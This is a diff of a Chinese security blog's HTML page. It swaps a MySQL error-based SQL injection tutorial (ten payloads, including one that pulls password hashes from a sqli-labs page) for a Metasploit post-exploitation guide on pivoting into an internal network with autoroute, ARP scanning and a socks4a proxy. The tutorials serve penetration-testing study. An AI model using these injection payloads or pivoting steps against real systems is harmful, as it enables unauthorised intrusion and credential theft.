@@ -7,18 +7,18 @@
 
 
 
-    <meta name="description" content="Mysql注入笔记(四) 报错注入在不能使用union联合注入时，需要使用报错注入，使用特殊的函数来报错。12345678910111213141516171819202122232425262728291.floor()select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(ran">
+    <meta name="description" content="使用msf的socks4a模块进入内网 当拿下边界主机后，查询到存在一个内网，此时需要设置代理来进行内网渗透，msf中socks4a模块提供了很大的方便。 首先查看内网网段123456meterpreter &amp;gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post/multi/manage/autorout">
 <meta property="og:type" content="article">
 <meta property="og:title" content="lsadaharu">
-<meta property="og:url" content="http://yoursite.com/2019/08/04/sql注入_mysql_4/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/08/28/使用msf的socks4a模块进入内网/index.html">
 <meta property="og:site_name" content="lsadaharu">
-<meta property="og:description" content="Mysql注入笔记(四) 报错注入在不能使用union联合注入时，需要使用报错注入，使用特殊的函数来报错。12345678910111213141516171819202122232425262728291.floor()select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(ran">
+<meta property="og:description" content="使用msf的socks4a模块进入内网 当拿下边界主机后，查询到存在一个内网，此时需要设置代理来进行内网渗透，msf中socks4a模块提供了很大的方便。 首先查看内网网段123456meterpreter &amp;gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post/multi/manage/autorout">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://yoursite.com/images/og_image.png">
-<meta property="og:updated_time" content="2019-08-04T02:21:35.703Z">
+<meta property="og:updated_time" content="2019-08-28T08:52:05.537Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="lsadaharu">
-<meta name="twitter:description" content="Mysql注入笔记(四) 报错注入在不能使用union联合注入时，需要使用报错注入，使用特殊的函数来报错。12345678910111213141516171819202122232425262728291.floor()select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(ran">
+<meta name="twitter:description" content="使用msf的socks4a模块进入内网 当拿下边界主机后，查询到存在一个内网，此时需要设置代理来进行内网渗透，msf中socks4a模块提供了很大的方便。 首先查看内网网段123456meterpreter &amp;gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post/multi/manage/autorout">
 <meta name="twitter:image" content="http://yoursite.com/images/og_image.png">
 
 
@@ -144,13 +144,13 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-08-04T02:38:49.219Z">2019-08-04</time>
+                <time class="level-item has-text-grey" datetime="2019-08-28T08:54:41.895Z">2019-08-28</time>
                 
                 
                 <span class="level-item has-text-grey">
                     
                     
-                    5 minutes read (About 679 words)
+                    3 minutes read (About 415 words)
                 </span>
                 
                 
@@ -163,14 +163,28 @@
             
         </h1>
         <div class="content">
-            <h1 id="Mysql注入笔记-四"><a href="#Mysql注入笔记-四" class="headerlink" title="Mysql注入笔记(四)"></a>Mysql注入笔记(四)</h1><hr>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在不能使用union联合注入时，需要使用报错注入，使用特殊的函数来报错。<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">select * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure></p>
-<p>使用函数报错需要直到函数的使用方法和报错的原理，以floor()函数为例。<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure></p>
-<p>从里向外解读floor(rand(0)<em>2)-&gt;rand()返回一个0到1的浮点数，若指定一个整数的参数N，则它被用作种子值，用来产生随机数，floor(x)返回不大于x的最大整数值。a与x为别名，在查询时建立临时的列或内容，如(xxx)a,a的列的内容为xxx。在使用floor报错时不能使用group_concat函数查询数据，只能使用limt逐个取值。<br>使用conca()函数解读，如concat(user(),x)函数将user(),x拼接，得到字符串-&gt;user()0或user()1，此时查询时会判断虚拟表中有没有user()0如果没有则进行floor(rand(0)</em>2)的第二次运算，第一次运算判断虚拟表中存不存在以有的数据段，如果有则count(*)增加1，如果没有则进行第二次运算并将数据插入虚拟表中，group by后为虚拟表中的主键，报错的关键是主键的改变(在mysql 数据库中主键是唯一的不能出现多个主键)。</p>
-<h3 id="其他函数可通过查阅php手册，mysql手册来解读。"><a href="#其他函数可通过查阅php手册，mysql手册来解读。" class="headerlink" title="其他函数可通过查阅php手册，mysql手册来解读。"></a>其他函数可通过查阅php手册，mysql手册来解读。</h3><h2 id="在使用报错注入中经常会遇到报错的字段长度或转码的长度限制于32位，可使用substr-函数截取分割"><a href="#在使用报错注入中经常会遇到报错的字段长度或转码的长度限制于32位，可使用substr-函数截取分割" class="headerlink" title="在使用报错注入中经常会遇到报错的字段长度或转码的长度限制于32位，可使用substr()函数截取分割"></a>在使用报错注入中经常会遇到报错的字段长度或转码的长度限制于32位，可使用substr()函数截取分割</h2><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">substr(string string,num start,num length);</span><br><span class="line"></span><br><span class="line">string为字符串</span><br><span class="line"></span><br><span class="line">start为起始位置</span><br><span class="line"></span><br><span class="line">length为长度</span><br><span class="line"></span><br><span class="line">127.0.0.1/sqli/Less-1/?id=1<span class="hljs-string">' and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +</span></span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h2><p>404大佬的mysql注入文档:<a href="https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI" target="_blank" rel="noopener">https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI</a><br>floor函数解读:<a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/80455884</a></p>
-
+            <h1 id="使用msf的socks4a模块进入内网"><a href="#使用msf的socks4a模块进入内网" class="headerlink" title="使用msf的socks4a模块进入内网"></a>使用msf的socks4a模块进入内网</h1><hr>
+<h2 id="当拿下边界主机后，查询到存在一个内网，此时需要设置代理来进行内网渗透，msf中socks4a模块提供了很大的方便。"><a href="#当拿下边界主机后，查询到存在一个内网，此时需要设置代理来进行内网渗透，msf中socks4a模块提供了很大的方便。" class="headerlink" title="当拿下边界主机后，查询到存在一个内网，此时需要设置代理来进行内网渗透，msf中socks4a模块提供了很大的方便。"></a>当拿下边界主机后，查询到存在一个内网，此时需要设置代理来进行内网渗透，msf中socks4a模块提供了很大的方便。</h2><ol>
+<li>首先查看内网网段<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: 10.0.110.0/255.255.255.0</span><br><span class="line">Local subnet: 132.21.21.0/255.255.255.0</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>发现存在内网10.0.110.0的内网网段，</p>
+<ol start="2">
+<li><p>将内网的网段添加到路由表并查看路由表是否添加好，路由表不使用了记得删除即可。</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.0.110.0/24 <span class="hljs-comment">#添加路由表</span></span><br><span class="line">run autoroute -p <span class="hljs-comment">#查看路由表是否添加</span></span><br><span class="line">run autoroute -d -s 10.0.110.0/24 <span class="hljs-comment">#删除路由表</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用扫描模块可以对内网主机扫描，查看主机数量</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner rhosts=10.0.110.0/24</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>保存会话，使用socks4a代理模块对内网主机进行渗透</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background <span class="hljs-comment">#保存会话</span></span><br><span class="line">msf5 &gt; use auxiliary/server/socks4a <span class="hljs-comment">#使用socks4a代理模块</span></span><br><span class="line">msf5 auxiliary(socks4a)&gt; <span class="hljs-built_in">set</span> srvhost 127.0.0.1 <span class="hljs-comment">#设置本地为监听地址</span></span><br><span class="line">msf5 auxiliary(socks4a)&gt; <span class="hljs-built_in">set</span> srvport 1080 <span class="hljs-comment">#设置监听端口</span></span><br><span class="line">msf5 auxiliary(socks4a)&gt; run <span class="hljs-comment">#运行，代理设置完成</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>设置proxychains的配置文件proxychains.conf</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains.conf</span><br><span class="line">[ProxyList]</span><br><span class="line">socks4 127.0.0.1 1080 <span class="hljs-comment">#添加代理</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>此时可以使用proxychains代理其他软件用于渗透了。</p>
+<h3 id="注意！使用socks4a代理时，socks代理不了底层协议，这是socks协议本身的原因，只能在tcp这一层以及往上一层，底层协议如icmp和arp这种就不怎么适用了，所以使用相关软件时因注意发包使用的协议。"><a href="#注意！使用socks4a代理时，socks代理不了底层协议，这是socks协议本身的原因，只能在tcp这一层以及往上一层，底层协议如icmp和arp这种就不怎么适用了，所以使用相关软件时因注意发包使用的协议。" class="headerlink" title="注意！使用socks4a代理时，socks代理不了底层协议，这是socks协议本身的原因，只能在tcp这一层以及往上一层，底层协议如icmp和arp这种就不怎么适用了，所以使用相关软件时因注意发包使用的协议。"></a>注意！使用socks4a代理时，socks代理不了底层协议，这是socks协议本身的原因，只能在tcp这一层以及往上一层，底层协议如icmp和arp这种就不怎么适用了，所以使用相关软件时因注意发包使用的协议。</h3>
         </div>
         
         
@@ -220,12 +234,19 @@
     <div class="level post-navigation is-flex-wrap is-mobile">
         
         <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/08/04/windows与linux命令/">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/08/28/MSF与CS两者之间的联动/">
                 <i class="level-item fas fa-chevron-left"></i>
                 <span class="level-item"></span>
             </a>
         </div>
         
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/08/17/MSSQL注入笔记/">
+                <span class="level-item"></span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
         
     </div>
 </div>
